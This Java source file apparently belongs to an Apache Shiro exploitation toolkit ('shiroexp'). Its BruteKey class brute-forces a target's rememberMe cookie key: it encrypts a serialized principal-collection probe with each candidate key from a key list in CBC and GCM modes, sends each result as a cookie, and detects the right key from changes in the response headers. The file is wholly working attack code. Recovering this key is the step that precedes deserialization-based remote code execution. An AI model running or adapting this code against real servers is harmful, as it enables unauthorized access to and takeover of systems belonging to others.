package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.request.HttpRequest;
import com.y5neko.shiroexp.request.ResponseOBJ;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;

public class BruteKey {
    /**
     * @param url 目标地址
     * @return 正确的key
     */
    public static KeyInfo bruteKey(TargetOBJ url) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        return bruteKey(url, "rememberMe");
    }

    /**
     * key爆破模块
     * @param url 目标地址
     * @param rememberMeString 自定义rememberMe字段名
     * @return 正确的key
     */
    public static KeyInfo bruteKey(TargetOBJ url, String rememberMeString) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        String key;
        String checkData = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==";
        String[] keys = Tools.multiLoadFile("./misc/keys.txt");
        KeyInfo keyInfo = new KeyInfo();

        for (int i = 0; i < keys.length; i++) {
            String payload_cbc = rememberMeString + "=" + Tools.CBC_Encrypt(keys[i], checkData);
            String payload_gcm = rememberMeString + "=" + Tools.GCM_Encrypt(keys[i], checkData);

            System.out.println("[" + Tools.color("INFO", "BLUE") + "] " + "正在尝试key: " + keys[i]);

            Map<String, String> headers_123 = new HashMap<>();
            headers_123.put("Cookie", rememberMeString + "=" + "123");
            ResponseOBJ response_123 = HttpRequest.httpRequest(url, null, headers_123, "GET");

            Map<String, String> headers_cbc = new HashMap<>();
            headers_cbc.put("Cookie", payload_cbc);
            ResponseOBJ response_cbc = HttpRequest.httpRequest(url, null, headers_cbc, "GET");

            Map<String, String> headers_gcm = new HashMap<>();
            headers_gcm.put("Cookie", payload_gcm);
            ResponseOBJ response_gcm = HttpRequest.httpRequest(url, null, headers_gcm, "GET");

            if (response_123 != null && response_cbc != null && response_gcm != null) {
                int length_123 = response_123.getHeaders().size();
                int length_cbc = response_cbc.getHeaders().size();
                int length_gcm = response_gcm.getHeaders().size();

                if (length_cbc != length_123 && response_cbc.getStatusCode() != 400 && response_cbc.getHeaders().get("Set-Cookie") == null) {
                    key = keys[i];
                    keyInfo.setKey(key);
                    keyInfo.setType("CBC");
                    break;
                }
                if (length_gcm != length_123 && response_gcm.getStatusCode() != 400 && response_gcm.getHeaders().get("Set-Cookie") == null){
                    key = keys[i];
                    keyInfo.setKey(key);
                    keyInfo.setType("GCM");
                    break;
                }
            }
        }
        return keyInfo;
    }

    public static void main(String[] args) throws InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        KeyInfo key = bruteKey(new TargetOBJ("http://127.0.0.1:8080/login"));
        System.out.println(key);
    }
}

